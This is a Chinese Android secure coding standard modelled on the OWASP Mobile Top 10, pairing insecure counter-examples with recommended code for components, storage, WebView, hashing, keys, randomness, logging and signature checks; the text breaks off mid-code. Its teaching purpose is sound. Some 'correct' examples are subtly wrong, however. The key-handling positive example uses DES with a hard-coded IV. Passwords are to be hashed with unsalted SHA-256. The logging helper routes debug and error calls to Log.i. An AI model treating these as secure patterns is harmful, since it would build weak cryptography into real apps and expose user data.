---
date: 2018-08-31
title: 06.Android安全编码规范
categories:
  - 2.SDL规范文档
description: Android安全编码规范
type: Document
---

文档贡献者： 108haili

协作：

-------

## 1.目的

为使系统开发人员能够编写符合安全要求的代码，以降低代码安全漏洞，减少代码被利用的可能性，从而提升各系统安全水平，符合国家安全合规性要求，保障产品安全稳定运营以及信息安全，特制定本规范。

## 2.引用规范

* 《信息安全技术移动智能终端个人信息保护技术要求》
* 《YD/T 1438-2006 数字移动台应用层软件功能要求和测试方法》
* 《YD/T 2307-2011 数字移动通信终端通用功能技术要求和测试方法》
* 《中国金融移动支付客户端技术规范》
* 《中国金融移动支付应用安全规范》
* 《移动互联网应用软件安全评估大纲》
* 《中国国家信息安全漏洞库CNNVD》
* 《OWASP Mobile Top 10 2017》

## 3.适用范围

本规范适用于研发中心各级产品的设计、开发及管理过程。其它研发机构可参考本管理规范；
Android安全编码规范目标是为开发人员提供安全编码学习的参考资料，也可为Android安全编码和Android安全编码人工审计提供依据。
安全编码原则：

> 长远性和现实性相结合

既要兼顾银行的目前状况与长远发展等因素，放眼未来、统筹规划，又要具有可行性。

> 全面性和针对性相结合

既要具有全面性、着眼全局、不能遗漏，又要突出重点，建设方案和实施计划具有较强的针对性。

> 整体性和阶段性相结合

既要制定整体发展规划、安全建设蓝图等战略性指导和安全策略文档，又要制定出体系实施的阶段性目标，分期分批实施。

> 先进性和实用性相结合

在信息安全战略和策略、目标和要求、规定和制度、技术、人员和知识等各方面，既要有先进性（例如虚拟化技术），又要有实用性。

> 开放性和可扩展性相结合

应采用最新且成熟的体系框架，保证具有开放性和可扩展性。

> 完整性和经济性相结合

既要考虑采用的产品和技术在整体上具有完整性和一致性，又要尽量保护银行已有的软硬件投资，使得总体上具有更好经济性。

-------

## 4.安全编码规则

本篇参考OWASP Mobile Top 10 2016分别从平台使用不当、不安全的数据储存、不安全的通信、不安全的认证、加密不足、不安全的授权、客户端的代码质量、代码篡改、逆向工程、多余的功能、其他安全问题10个方面规定了如何在代码方面防范软件安全问题。这些问题一旦出现将会形成软件安全漏洞如秘钥使用不当、件最小化组件暴露等造成生产安全事故，可能带来经济、客户、声誉等方面重大的损失。

### 4.1.平台使用不当

-------

#### 4.1.1.定义

“平台使用不当”包涵Android控件的配置不当或编码不当。包括Activity、Service、ContentProvider、Broadcast Receiver、Intent组件、WebView组件使用过程中配置是否规范与编码是否规范。

#### 4.1.2.风险

“平台使用不当”会造成的风险包括组件被恶意调用、恶意发送广播、恶意启动应用服务、恶意调用组件，拦截组件返回的数据、远程代码执行等。

#### 4.1.3.防范方法

-------

##### 4.1.3.1.预防组件最小化组件暴露

* 【规范要求】

针对不需要进行跨应用调用的组件，应在配置文件（AndroidManifest.xml）中显示配置android:exported="false"属性。

>【详细说明】

组件配置android:exported="false"属性，表明它为私有组件，只可在同一个应用程序组件间或带有相同用户ID的应用程序间才能启动或绑定该服务。在非必要情况下，如果该属性设置为“true”，则该组件可以被任意应用执行启动操作，造成组件恶意调用等风险。

* 【代码示例】

AndroidManifest.xml配置文件中activity组件的配置方式示例。

> 反例

```xml
<activity
     android:name="com.example.bkdemo2.LoginActivity"
     android:exported="true"
     android:label="@string/app_name" >
</activity>
```

> 正例

```xml
<activity
     android:name="com.example.bkdemo2.LoginActivity"
     android:exported="false"
     android:label="@string/app_name" >
</activity>
```

-------

##### 4.1.3.2.公开的组件安全

* 【规范要求】

因特殊需要而公开的Activity、Service、Broadcast Receiver、Content Provider组件建议添加自定义permission权限进行访问控制。

* 【详情说明】

因特殊需要而公开（exported=”true”）的对于需要公开的 Activity、Service、Broadcast Receiver、Content Provider组件采用自定义访问权限的方法提供访问控制波保护。通过自定义访问权限保护后公开的组件只能被申请了该权限的外部应用（Application）调用，未申请权限的外部应用（Application）在调用时将会出现“java.lang.SecurityException: Not allowed to bind to service Intent”异常，造成调用失败。

程序中的启动/使用Activity、Service、Broadcast Receiver、Content Provider则由程序定位与需求来确认是否添加自定义访问权限，启动的Activity、Service、Broadcast Receiver、Content Provider本身是需要被其他程序进行调用的，如果没有特殊需求（该程序只允许指定APP启动）的话就不能添加该权限。

【代码示例】

> 1) AndroidManifest.xml中的定义/注册权限的写法为：

```xml
<permission
      android:name="com.ijiami.permission.testPermission"
      android:label="@string/app_name"
      android:protectionLevel="normal" />
```

> 2)AndroidManifest.xml中Activity组件使用已注册的自定义权限写法为：

```xml
<activity
      android:name="com.example.bkdemo2.LoginActivity"
      android:exported="true"
      android:label="@string/app_name"
      android:permission="com.ijiami.permission.testPermission" >
</activity>
```

> 3)AndroidManifest.xml中Service组件使用已注册的自定义权限写法为：

```xml
<Service
      android:name="com.example.bkdemo2.LoginService"
      android:exported="true"
      android:label="@string/app_name"
      android:permission="com.ijiami.permission.testPermission" >
</ Service>
```

> 4)AndroidManifest.xml中Receiver组件使用已注册的自定义权限写法为：

```xml
<receiver  
      android:name="com.example.bkdemo2.testReceiver"
      android:exported="true"
      android:label="@string/app_name"
      android:permission="com.ijiami.permission.testPermission" >
</receiver>
```

> 5)Receiver组件使用已注册的自定义权限写法（代码中使用）：

```xml
IntentFilter iFilter = new IntentFilter();
iFilter.addAction("com.example.bkdemo2.testReceiver");
this.registerReceiver(myReciver, iFilter, "com.ijiami.permission.testPermission", handler);
```

> 6）AndroidManifest.xml中ContentProvider组件使用已注册的自定义权限写法为：

```xml
<provider
      android:name="com.example.bkdemo2.testProvider"
      android:exported="true"
      android:label="@string/app_name"
      android:permission="com.ijiami.permission.testPermission" >
</provider>
```

> 7)外部应用需要使用自定义权限的写法（AndroidManifest.xml配置）为：

```xml
<uses-permission android:name="com.ijiami.permission.testPermission" />
```

> 8)外部应用Receiver组件需要使用自定义权限的写法（代码中配置）为：

```xml
this.sendBroadcast(intent, "com.ijiami.permission.testPermission");
```

-------

##### 4.1.3.3.ContentProvider安全

* 【规范要求】

对于不同场景的ContentProvider数据需配置不同的组件参数、造函数参数，对ContentProvider数据的使用过程进行保护。ContentProvider需要通过配置组件参数与设置不同构造函数参数来对不同场景的数据使用进行保护。

* 【详情说明】

ContentProvider组件是数据提供者组件，可以为外部应用提供统一的数据存储和读取接口。在ContentProvider的使用过程中，应根据业务的需要，严格控制数据的增删改查权限，避免非必要的权限开放。非必要的权限开放会造成数据泄露、数据完整性被破坏等安全风险。如：一段只读数据开放了可写权限，则任何的外部应用都可以对该数据进行篡改，造成数据损坏。一个Provider里面可能有私有数据，也有公有数据。也就是说，有可能有些数据可以公开，有些不能公开。并且，有些数据可以让别人修改，有些不能让别人修改。

* 【代码示例】
> 1) 单独对设置pathPattern下的访问控制权限（访问pathPattern路径下需要permission权限）：
> 2) 对设置了pathPattern的provider添加自定义访问控制权限（访问pathPattern路径下文件需要添加自定义permission权限）：

```xml
<provider
      android:name=".testProvider"
      android:authorities="com.ijiami.testProvider"
      android:multiprocess="true">
      <path-permission
            android:pathPattern="/apk/.*"
            android:permission="com.ijiami.testProvider.permission.application.
                 read"/>
</provider>
```

> 3)provider设置全局可读权限：

```xml
<provider
     android:name=".testProvider"
     android:authorities="com.ijiami.testProvider"
     android:multiprocess="true"
     android:readPermission="com.ijiami.permission.readPermission" >
</provider>
```

> 4)provider设置全局可写权限：

```xml
<provider
     android:name=".testProvider"
     android:authorities="com.ijiami.testProvider"
     android:multiprocess="true"
     android:writePermission="com.ijiami.permission.writePermission" >
</provider>
```

> 5)provider设置全局可读/写权限：

```xml
<provider
     android:name=".testProvider"
     android:authorities="com.ijiami.testProvider"
     android:multiprocess="true"
     android:permission="com.ijiami.permission.writeAndReadPermission" >
</provider>
```

-------

##### 4.1.3.4.Intent意图使用

* 【规范要求】

为了更高的数据安全及更小的性能消耗，在使用Intent进行组件（Activity、Content provider、Broadcast receiver、Service）间跳转时应尽量使用显示调用，非特殊情况，应避免使用隐式调用Intent进行权限设置，包括Activity、Content provider、Broadcast receiver、Service等，为了数据安全与性能消耗须使用显式调用尽量减少使用隐式调用。

* 【详情说明】

显式调用：通过指定Intent组件名称来实现的，它一般用在知道目标组件名称的前提下，使用Intent.setComponent()、Intent.setClassName()、Intent.setClass()方法进行目标组件的指向或者在Intent对象初始化“new Intent(A.class,B.class)”时指明需要转向的组件。显式调用意图明确的指定了要激活的组件，一般在应用程序内部组件间跳转时都应使用显示调用。

隐式调用：通过Intent Filter来实现的，它一般在不能明确知道目标组件名称的情况下，通过设置动作(action)、类别(category)、数据（URI和数据类型）等隐式意图的方式来进行目标跳转，Android系统会根据设置的隐式意图找到最合适的组件作为目标组件进行跳转。隐式调用一般是用于在不同应用程序之间的组件跳转，因跳转目标是由系统来进行判断，特殊情况下会出现目标错误，造成传递数据泄露的安全风险，并且隐式调用对性能消耗较大。

* 【代码示例】

显式调用代码：

```java
Intent intent = new Intent();
Bundle bundle = new Bundle();
bundle.putString("id", "strID");
intent.setClass(this, Intent_Demo1_Result1.class);
intent.putExtras(bundle);
startActivity(intent);
```

-------

##### 4.1.3.5.预防Webview远程代码执行

【规范要求】

无特殊原因，targetSdkVersion设置应大于等于17。如因特殊需要targetSdkVersion版本设置低于17，应禁止Webview远程代码执行权限，防止被远程控制。

【详情说明】

android targetSdkVersion版本低于17时，WebView组件存在远程代码执行漏洞，中间人可以利用Webview的漏洞执行任意代码。

如果由于特殊原因需要把targetSdkVersion设置为低于17的时候，因webView本身存在的安全漏洞，应对webView.load指定加载的url/path的html/js文件进行认证与完整性验证，确包加载的url/path完整性，防止因为url/path被篡改而造成的远程控制的代码执行风险。

【代码示例】

```xml
<uses-sdk android:minSdkVersion="8" android:targetSdkVersion="17" />
```

-------

##### 4.1.3.6.数据备份和恢复设置

-------

* 【规范要求】

正式发布的应用应关闭数据备份功能。应在AndroidManifest.xml的Application参数设置中将android:allowBackup参数显示设置为“false”，关闭非root情况下允许对应用数据的备份与恢复功能。

* 【详情说明】

当在AndroidManifest.xml中application配置参数allowBackup被设置为true或不设置该标志时，应用程序数据可以再非root状态下进行数据的备份和恢复，攻击者可以通过adb调试指令直接复制应用程序数据。造成应用数据泄露风险。

* 【代码示例】

```xml
android:allowBackup="false"
```

-------

### 4.2.不安全的数据储存

-------

#### 4.2.1.定义

“不安全的数据储存”涵盖了平台功能的误用或平台安全控件使用失败引起的问题与预防方案，其中包括：SharedPreference数据储存安全、密码储存安全、sdcard数据储存安全。

#### 4.2.2.风险

Android编码规范中“不安全的数据储存”会造成的风险包括：密码泄露、敏感信息泄露、敏感数据完整性破坏等风险。

#### 4.2.3.防范方法

-------

##### 4.2.3.1.SharedPreference数据储存安全

* 【规范要求】

进行SharedPreference数据存储时应使用私有化（MODE_PRIVATE模式）存储模式。避免使用共享可读、可写模式存储。

* 【详情说明】

MODE_WORLD_READABL或MODE_WORLD_READABLE模式存储数据表示该数据是可共享给其他外部程序使用的，目前在android4.0以上版本已经废弃了该模式，建议在使用SharedPreference存储时应采用MODE_PRIVATE进行私有化模式存储，防存在内容被替换的风险。

* 【代码示例】

> 反例：存在数据安全风险的SharedPreference创建方式：

```java
SharedPreferences mySharedPreferences= getSharedPreferences("test",Activity.MODE_WORLD_READABLE);
SharedPreferences mySharedPreferences= getSharedPreferences("test",Activity.MODE_WORLD_WRITEABLE);
```

> 正例：安全规范的SharedPreference创建方式：

```java
SharedPreferences mySharedPreferences= getSharedPreferences("test",Activity.MODE_PRIVATE);
```

-------

##### 4.2.3.2.密码储存安全

* 【规范要求】

在特殊情况下需要对密码进行落地存储，不应存储用户的密码信息，而是存储用户的密码的摘要（HASH）信息，每次用户登录时进行摘要匹配。

* 【详情说明】

本地进行密码信息存储时，应储存密码的摘要(HASH)信息。预防终端被ROOT情况下，受保护的系统目录下的本地储存数据被随意访问造成密码泄露风险。

##### 4.2.3.3.避免使用sdcard数据储存

* 【规范要求】

在进行数据避免将数据储存到sdcard中，尽量使用sqlite、sharedpreferences或系统私有目录的file文件进行数据储存。

* 【详情说明】

使用外部存储实现数据持久化，这里的外部存储一般就是指的是sdcard。使用sdcard存储的数据，不限制只有本应用访问，任何可以有访问Sdcard权限的应用均可以访问，容易导致信息泄漏安全风险。

### 4.3.不安全的通信

#### 4.3.1.定义

“不安全的通信”涵盖了在Android代码编写过程使用不安全的方式进行客户端与服务端业务交互，比如：通讯数据安全、会话安全等。

#### 4.3.2 风险

Android编码规范中“不安全的通信”可能造成服务端储存的数据被无权限访问风险。

#### 4.3.3.防范方法

-------

##### 4.3.3.1.会话安全

* 【规范要求】

使用Http协议进行会话时，建议将session ID设置在Cookie头中，服务器根据该sessionID获取对应的Session，而不是重新创建一个新Session。

* 【详情说明】

当客户端访问一个使用session 的站点，同时在自己机器上建立一个cookie时，如果未使用服务端的session机制进行会话通信则可能造成服务端储存的数据存在被任意访问风险。

* 【代码示例】

```java
java.net.HttpURLConnection获取Cookie：
URL url = new URL("requrl");
HttpURLConnection con = (HttpURLConnection) url.openConnection();
// 取得sessionid.
String cookieval = con.getHeaderField("set-cookie");
String sessionid;
if (cookieval != null) {
  sessionid = cookieval.substring(0, cookieval.indexOf(";"));
}
java.net.HttpURLConnection发送设置cookie：
URL url = new URL("requrl");
HttpURLConnection con = (HttpURLConnection) url.openConnection();
if (sessionid != null) {
  con.setRequestProperty("cookie", sessionid);
}
org.apache.http.client.HttpClient设置cookie：
HttpClient http = new DefaultHttpClient();
HttpGet httppost = new HttpGet("url");
httppost.addHeader("Cookie", sessionId);
```

-------

### 4.4.不安全的认证

-------

#### 4.4.1.定义

“不安全的认证”指在一个Android应用程序中，如果试图在没有适当的安全措施的情况下，仅仅通过客户端检测进行用户验证或授权，那么就是存在不安全认证的风险，比如：预防WebView自动保存密码功能。

#### 4.4.2.风险

Android编码中“不安全的认证”会造成的风险包括：WebView使用使用过程中的密码泄露；

#### 4.4.3.防范方法

-------

##### 4.4.3.1.预防WebView自动保存密码功能

* 【规范要求】

在使用WebView控件时，应显示关闭控件自带的记住密码功能。即：设置WebView.getSettings().setSavePassword(false);

* 【详情说明】

Google在设计WebView的时候提供默认自带记住密码的功能，即程序在不设置theWebView.getSettings().setSavePassword(false);的时候WebView在使用密码控件后会自动弹出界面提示用户是否记住密码，如果用户选择“记住”选择项后密码会明文储存在/data/data/com.package.name/databases/webview.db中，如果设备中出现了Root提权的其他应用的时候该应用则可直接读取所有应用通过webView储存的密码。所以在使用Webview时应显示关闭Webview的自动保存密码功能，防止用户密码被Webview明文存储在设备中。

* 【代码示例】

> 1）关闭WebView的自动保存密码功能代码为：

```java
theWebView.getSettings().setSavePassword(false);
```

> 2)不关闭WebView的自动保存密码功能时功能提示截图：

![功能提示截图](/images/2018/08/01.png)

-------

### 4.5.加密不足

-------

#### 4.5.1.定义

“加密不足”指当一个Android程序存储数据的位置本身教脆弱时，那么这个漏洞就会产生，比如：加密算法使用不规范、硬编码形式储存密钥等。

#### 4.5.2.风险

Android编码规范中“加密不足”会造成的风险包括：已加密的敏感数据被破解与窃取风险。

#### 4.5.3.防范方法

-------

##### 4.5.3.1.加密算法使用规范

* 【规范要求】

> 1) 不建议对密码等敏感信息使用如下加密算法：

* * MD2
* * MD4
* * MD5
* * SHA-1
* * PIPEMD

> 2)安全规范建议使用加密算法：

* * SHA-256
* * SHA-3

* 【代码示例】

反例：不建议对密码、敏感等信息使用的加密算法类型（MD5）：

```java
MessageDigest md = MessageDigest.getInstance("MD5");
byte[] md5Bytes = md.digest("password".getBytes());
String result = Base64.encodeToString(md5Bytes, Base64.DEFAULT);
```

-------

正例：安全规范对密码、敏感信息加密要求使用的算法类型（SHA-256）:

```java
byte[] input = "password".getBytes();
MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
sha256.update(input);
byte[] output = sha256.digest();
String result = Base64.encodeToString(output, Base64.DEFAULT);
```

-------

##### 4.5.3.2.禁止硬编码形式存储密钥

* 【规范要求】

> 1）使用SharedPreference进行密钥存储时，应对密钥进行加密处理。使用so库进行密钥的存储，并且将整体的加密、解密操作都放在so库中进行。将密钥进行加密存储在assets目录下，将加密、解密过程存储在so库文件中，并对so库文件进行加壳等安全保护，增强密钥保护的安全强度。

* 【详情说明】

信息安全的基础在于密码学，而常用的密码学算法都是公开的，加密内容的保密依靠的是密钥的保密，密钥如果泄露，对于对称密码算法，根据用到的密钥算法和加密后的密文，很容易得到加密前的明文；对于非对称密码算法或者签名算法，根据密钥和要加密的明文，很容易获得计算出签名值，从而伪造签名。

【代码示例】

反例

```java
/**
  * DES算法，加密
  *
  * @param data
  *            待加密字符串
  * @param key
  *            加密私钥，长度不能够小于8位
  * @return 加密后的字节数组，一般结合Base64编码使用
  * @throws CryptException
  *             　　　　　　 异常
  */
private static String encode(String key, byte[] data) throws Exception {
  try {
    DESKeySpec dks = new DESKeySpec(key.getBytes());
    SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
    Key secretKey = keyFactory.generateSecret(dks);
    Cipher cipher = Cipher.getInstance(ALGORITHM_DES);
    IvParameterSpec iv = new IvParameterSpec("12345678".getBytes());
    AlgorithmParameterSpec paramSpec = iv;
    cipher.init(Cipher.ENCRYPT_MODE, secretKey, paramSpec);
    byte[] bytes = cipher.doFinal(data);
    return Base64.encodeToString(bytes, 0);
  } catch (Exception e) {
    throw new Exception(e);
  }
}
```

正例：

```java
  /**
  * DES算法，解密
  *
  * @param data
  *            待解密字符串
  * @param key
  *            解密私钥，长度不能够小于8位
  * @return 解密后的字节数组
  * @throws Exception
  *             异常
  */
private static byte[] decode(String key, byte[] data) throws Exception {
  try {
    DESKeySpec dks = new DESKeySpec(key.getBytes());
    SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
    Key secretKey = keyFactory.generateSecret(dks);
    Cipher cipher = Cipher.getInstance(ALGORITHM_DES);
    IvParameterSpec iv = new IvParameterSpec("12345678".getBytes());
    AlgorithmParameterSpec paramSpec = iv;
    cipher.init(Cipher.DECRYPT_MODE, secretKey, paramSpec);
    return cipher.doFinal(data);
  } catch (Exception e) {
    throw new Exception(e);
  }
}
```

-------

### 4.6.不安全的授权

-------

#### 4.6.1.定义

“不安全的授权”指在一个Android应用程序中，如果试图在没有适当的安全措施的情况下，仅仅通过客户端检测进行用户验证或授权，那么就是存在风险的，比如：分配唯一ID安全策略、避免使用IMEI作为设备唯一ID等。

#### 4.6.2.风险

Android编码规范中“不安全的授权”造成的风险包括：本地储存的敏感数据被非法替换、APP被恶意刷量、信息伪造等风险。

#### 4.6.3.防范方法

-------

##### 4.6.3.1.分配唯一的ID

* 【规范要求】

为每一个具有访问权限的用户分配唯一的ID，以保证任何对关键数据和支付软件进行的操作都能够被追溯到已知的、被授权的用户。

* 【详情说明】

为每一个具有访问权限的用户分配唯一的ID，以保证任何对关键数据和支付软件进行的操作都能够被追溯到已知的、被授权的用户；唯一ID的使用场景分析如下：

> 1）存在安全隐患的数据储存方案如下：

![存在安全隐患的数据储存方案](/images/2018/08/02.png)

通过如上方案加密的数据未与终端或用户唯一ID绑定，数据可直接被抽离出来后重新在任何其他终端被使用。

> 2）进行安全规范类加密的原理如下：

![进行安全规范类加密的原理](/images/2018/08/03.png)

通过如上方案对数据加密后，秘钥的组成加入终端或用户唯一ID，即使在数据被抽离出来后使用到任意APP中，但该数据由于在解密使用过程中与终端或用户的唯一ID不匹配而导致数据解密失败，无法使用，能有效防范数据调用的风险。

##### 4.6.3.2.避免使用IMEI作为设备唯一ID

* 【规范要求】

在需要使用设备唯一ID的业务场景中，应使用DEVICE_ID、MAC ADDRESS、Sim Serial Number、IMEI等数据据组装后生成Hash值来作为设备唯一ID。避免单独使用IMEI作为设备唯一ID标识。

* 【详情说明】

由于Android领域中有不少模拟器而模拟器可模拟与篡改IMEI；IMEI在个别特殊系统与终端在中是无法获取到的，基于如上分析如果把IMEI作为设备的唯一ID将出现一定的重复几率。

* 【代码示例】

> 1）获取DEVICE_ID

```java
TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
String DEVICE_ID = tm.getDeviceId();
```

> 2）获取MAC ADDRESS

```java
WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
WifiInfo info = wifi.getConnectionInfo();
String macAdress = info.getMacAddress();
```

> 3）获取Sim Serial Number

```java
TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
String SimSerialNumber = tm.getSimSerialNumber();
```

> 4）获取IMEI

```java
String IMEI = ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getDeviceId();
```

-------

### 4.7.客户端代码质量

-------

#### 4.7.1.定义

“客户端代码质量”指一个Android应用程序在编码过程中使用错误配置、过时API、缺少校验等编码而造成的风险，比如：APP拒绝服务、targetSdkVersion设置、随机数使用规范、禁止输出日志信息等。

#### 4.7.2.风险

Android编码规范中“客户端代码质量”会造成的风险包括：APP拒绝服务、使用WebView时引起的远程恶意代码执行、使用随机数业务出现规律、应用敏感数据泄露等。

#### 4.7.3.防范方法

-------

#### 4.7.3.1.预防APP拒绝服务

* 【规范要求】

对组件间传递的参数在接收前进行非空验证，避免因空参数造成的APP拒绝服务

* 【详情说明】

Activity，Service等组件因业务需要，部分是对外开放的（AndroidManifest.xml中exported属性为true或定义的intent-filter的组件是可导出组件），当这些组件对外部应用传递的参数未做校验时，可能因传入参数异常导致APP拒绝服务。对外开放组件要求严格校验输入参数，注意空值判定及类型转换判断，防止由于解析异常参数导致的应用崩溃。

* 【代码示例】

>1) 反例：会造成APP拒绝服务的Activity带参数跳转

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.activity_main);

  Intent intent = getIntent();
  Bundle mBundle = intent.getExtras();
  String getValue = mBundle.getString("value");
}
```

> 2)正例：预防造成APP拒绝服务的Activity带参数跳转

```java
@Override
protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.activity_main);

  Intent intent = getIntent();
  if (intent == null)
    return;
  Bundle mBundle = intent.getExtras();
  if (mBundle == null)
    return;
  String getValue = mBundle.getString("value");
  if (getValue == null)
    return;
}
```

-------

##### 4.7.3.2.targetSdkVersion设置

* 【规范要求】

因业务需要，在代码在那个需要使用低版本系统API是，通常我们会使用反射系统API的方式来进行调用，如果低版本系统API与高版本系统API存在冲突时，系统会参考清单文件（AndroidManifest.xml）中配置的targetSdkVersion参数来匹配最佳的系统API。如果因特殊原因需要把targetSdkVersion值设置为低于17时，由于webView的安全漏洞问题，需要对webView.load加载指定的url/path的html/js进行认证与完整性验证，确认load的url/path为原始文件，而非被篡改后文件。防止加载的文件存在恶意注入的远程控制代码。

* 【详情说明】

因Webview组件自身漏洞，建议AndroidManifest.xml中的targetSdkVersion属性应设置为大于等于17。targetSdkVersion=”17”即表示程序的测试目标机器是os 4.2系统，不建议把targetSdkVersion的参数设置低于17，主要的原因包括：1）os4.2以下系统的手机现阶段市场占有率非常低  2）os4.2及其以上的系统修复了之前系统中存在的大量安全问题与Bug，比如webView的安全问题等等；

注意：程序中使用低版本API函数情况的时候，程序会使用反射来进行低版本函数API的调用。如果有重复API与修复API的冲突时候程序会参考targetSdkVersion的设置选择最佳API进行调用或者反射。

* 【代码示例】

```xml
<uses-sdk android:minSdkVersion="8" android:targetSdkVersion="17" />
```

-------

##### 4.7.3.3.随机数使用规范

* 【规范要求】

因业务要求需要在代码中使用随机数功能，随机概率功能应通过/dev/urandom或者/dev/random获取的熵值对伪随机数生成器PRNG进行初始化操作。

* 【详情说明】

使用SecureRandom时不要使用SecureRandom(byte[]seed)这个构造函数，会造成生成的随机数不随机。建议通过/dev/urandom或者/dev/random获取的熵值对伪随机数生成器PRNG进行初始化操作。

* 【代码示例】

> 1)反例（不安全的随机数获取方法）：

```java
Random mRandom = new Random();
int rNum = mRandom.nextInt() * 10;

byte[] seed = new byte[16];
SecureRandom mSRandom = new SecureRandom(seed);

byte[] seed = new byte[16];
SecureRandom mSRandom = new SecureRandom();
mSRandom.setSeed(seed);

long seed = 123451;
SecureRandom mSRandom = new SecureRandom();
mSRandom.setSeed(seed);
```

> 2)正例(安全规范类的随机数获取方法)：

```java
byte[] output =new byte[16];
SecureRandom mSRandom = new SecureRandom();
mSRandom.nextBytes(output);
```

##### 4.7.3.4.发布应用中禁止输出日志信息

* 【规范要求】

* 1）因app的错误采集、异常反馈等需求而必要的日志建议遵循的安全编码规范：

* * Log.e()/Log.w()/Log.i()：建议打印操作日志；
* * Log.d()/Log.v()：建议打印开发日志；

* 2）敏感信息不应用Log.e()/Log.w()/Log.i(), System.out/System.err 进行打印；

* 3）敏感信息打印建议使用 Log.d()/Log.v()（前提：release版本将被自动去除）；

* 4）公开的APK文件应该是release版而不是development版；

* 5）使用android.util.Log类的方法输出日志，不推荐使用System.out/err；

* 6）ProGuard不能移除如下日志：Log.w(“Log”,"result:" + value).，所以建议使用全局变量控制日志的输出；

* 7）不建议将日志输出到sdscard中，因为sdcard的文件可被任何APP进行访问与读写。

* 【详情说明】

* 1） development version ：

开发版，正在开发内测的版本，会有许多调试日志；

* 2）release version ：

发行版，签名后开发给用户的正式版本，日志量较少；

* 3）android.util.Log提供了五种输出日志的方法：

Log.e(), Log.w(), Log.i(), Log.d(), Log.v()；

* 【代码示例】

安全规范建议使用日志统一管理代码：

```python

import android.util.Log;
/**
 * Log统一管理类
 *
 *
 *
 */
public class MyLog {

  private MyLog() {
    /* cannot be instantiated */
    throw new UnsupportedOperationException("cannot be instantiated");
  }

  // 是否需要打印bug，可以在application的onCreate函数里面初始化
  public static boolean isDebug = true;

  private static final String TAG = "way";

  // 下面四个是默认tag的函数
  public static void i(String msg) {
    if (isDebug)
      Log.i(TAG, msg);
  }

  public static void d(String msg) {
    if (isDebug)
      Log.d(TAG, msg);
  }

  public static void e(String msg) {
    if (isDebug)
      Log.e(TAG, msg);
  }

  public static void v(String msg) {
    if (isDebug)
      Log.v(TAG, msg);
  }

  // 下面是传入自定义tag的函数
  public static void i(String tag, String msg) {
    if (isDebug)
      Log.i(tag, msg);
  }

  public static void d(String tag, String msg) {
    if (isDebug)
      Log.i(tag, msg);
  }

  public static void e(String tag, String msg) {
    if (isDebug)
      Log.i(tag, msg);
  }

  public static void v(String tag, String msg) {
    if (isDebug)
      Log.i(tag, msg);
  }
}
```

-------

### 4.8.代码篡改

-------

#### 4.8.1.定义

“代码篡改”指当一个应用程序安装至移动设备后，代码和数据资源就存放到设备中了，攻击者可以通过直接修改代码、动态修改内存数据、更改或替换应用程序使用的系统API等方法，颠覆应用程序的运行过程和结果，以达到自身的不正当目的。

#### 4.8.2.风险

Android编码规范中“代码篡改”会造成的风险包括：二进制修改、本地资源修改、钩子注入（函数钩用）、函数重要业务逻辑篡改等。

#### 4.8.3.防范方法

-------

##### 4.8.3.1.签名校验

* 【规范要求】

对应用程序的签名MD5值进行校验以保证应用程序的完整性。当校验结果显示程序完整性被破坏后，应用程序应主动停止自身运行。

* 【详情说明】

打包签名后APK安装文件中任何文件一定被改动（如反编译），那么签名信息将失效。在整个APK编译过程中，是先进行APK文件的编译操作，然后进行签名操作。APK的签名方式包括keystore、私钥/公钥两种签名策略，而两种签名策略都基于证书文件进行签名，而每一个APP的生产者的签名证书都是自己独有的。
基于如上背景情况下如果在程序中进行对自身签名的校验即可保证程序安全。

* 【代码示例】

Android中获取自签名代码：

```java
/**
 * 字节数组转字符数组
 * @param mSignature
 * @return
 */
private char[] toChars(byte[] mSignature) {
  byte[] sig = mSignature;
  final int N = sig.length;
  final int N2 = N * 2;
  char[] text = new char[N2];
  for (int j = 0; j < N; j++) {
    byte v = sig[j];
    int d = (v >> 4) & 0xf;
    text[j * 2] = (char) (d >= 10 ? ('a' + d - 10) : ('0' + d));
    d = v & 0xf;
    text[j * 2 + 1] = (char) (d >= 10 ? ('a' + d - 10) : ('0' + d));
  }
  return text;
}

/**
 * 获取签名信息
 * @param context
 * @return
 */
public String getSign(Context context) {
  PackageManager pm = context.getPackageManager();
  List<PackageInfo> apps = pm
      .getInstalledPackages(PackageManager.GET_SIGNATURES);
  Iterator<PackageInfo> iter = apps.iterator();
  while (iter.hasNext()) {
    PackageInfo packageinfo = iter.next();
    String packageName = packageinfo.packageName;

    if (packageName != null
        && packageName.equals(context.getPackageName())) {
      return new String(toChars(packageinfo.signatures[0].toByteArray()));
    }
  }
  return null;
}
```

-------

Java中获取APK签名信息代码：

```java
/**
 * 字节数组转字符数组
 *
 * @param mSignature
 * @return
 */
private static char[] toChars(byte[] mSignature) {
  byte[] sig = mSignature;
  final int N = sig.length;
  final int N2 = N * 2;
  char[] text = new char[N2];

  for (int j = 0; j < N; j++) {
    byte v = sig[j];
    int d = (v >> 4) & 0xf;
    text[j * 2] = (char) (d >= 10 ? ('a' + d - 10) : ('0' + d));
    d = v & 0xf;
    text[j * 2 + 1] = (char) (d >= 10 ? ('a' + d - 10) : ('0' + d));
  }
  return text;
}

/**
 * 解析java.security.cert.Certificate对象
 * @param jarFile
 * @param je
 * @param readBuffer
 * @return
 */
private static java.security.cert.Certificate[] loadCertificates(
    JarFile jarFile, JarEntry je, byte[] readBuffer) {
  try {
    InputStream is = jarFile.getInputStream(je);
    while (is.read(readBuffer, 0, readBuffer.length) != -1) {
      }
    is.close();
    return (java.security.cert.Certificate[]) (je != null ? je
          .getCertificates() : null);
    } catch (Exception e) {
      e.printStackTrace();
      System.err.println("Exception reading " + je.getName() + " in "
          + jarFile.getName() + ": " + e);
    }
  return null;
}

/**
 * 获取签名
 * @param 文件路径
 * @return
 */
public static String getApkSignInfo(String apkFilePath) {
    byte[] readBuffer = new byte[8192];
  java.security.cert.Certificate[] certs = null;
  try {
    JarFile jarFile = new JarFile(apkFilePath);
    Enumeration<?> entries = jarFile.entries();
    while (entries.hasMoreElements()) {
      JarEntry je = (JarEntry) entries.nextElement();
      if (je.isDirectory()) {
        continue;
      }
